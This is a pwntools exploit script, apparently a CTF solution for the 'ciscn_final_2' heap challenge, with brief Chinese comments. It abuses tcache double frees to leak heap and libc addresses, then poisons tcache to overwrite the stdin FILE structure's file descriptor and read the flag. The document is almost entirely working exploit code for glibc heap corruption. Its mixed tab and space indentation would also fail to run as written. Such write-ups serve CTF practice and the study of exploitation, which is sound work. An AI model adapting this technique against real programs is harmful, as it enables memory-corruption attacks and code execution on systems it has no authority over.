#修改stdin_fileno为指定fd来获取flag
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'

p = process("ciscn_final_2")
elf = ELF("ciscn_final_2")
libc = ELF("./libc-2.27.so")
if args.G:
	gdb.attach(p)

def add(typ, num):
	p.recvuntil(">")
	p.sendline("1")
        p.recvuntil(">")
        p.sendline(str(typ))
        p.recvuntil(":")
        p.send(str(num))
def show(typ):
	p.recvuntil(">")
	p.sendline("3")
        p.recvuntil(">")
        p.sendline(str(typ))

def free(typ):
	p.recvuntil(">")
	p.sendline("2")
        p.recvuntil(">")
        p.sendline(str(typ))


def exp():
    add(1, 0x30)#0
    add(2, 0x20)#1
    add(2, 0x20)#2
    add(2, 0x20)#3 
    free(1)
    add(2, 0x20)#4
    free(2)
    add(1, 0x30)
    free(2)
    show(2)
    p.recvuntil(":")
    chunk0_addr = int(p.recvline().strip()) - 0xa0
    log.success("chunk0_addr ==> " + hex(chunk0_addr))
    add(2, chunk0_addr)
    add(2, 0)
    add(2, 0x91)
    for _ in range(7):
        free(1)
        add(2, 0x91)
    free(1)
    show(1)
    p.recvuntil(":")
    main_arena = int(p.recvline().strip()) -96
    libc_base = main_arena - libc.sym['__malloc_hook'] - 0x10
    log.success("libc_base ==> " + hex(libc_base))
    io_stdin = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x70
    add(1, io_stdin)    #这道题这能写fd低位，正好利用main_arena的高位
    add(1, 0x30)
    free(1)
    add(2, 0x20)
    free(1)
    show(1)
    p.recvuntil(":")
    chunk0_fd = int(p.recvline().strip()) -0x30
    
    add(1, chunk0_fd)
    add(1, 0)
    add(1, 0)
    add(1, 666)
    p.recvuntil(">")
    p.sendline("4")
    print p.recvuntil("received...\n")
    p.interactive()
    
if __name__ == '__main__':
	exp()
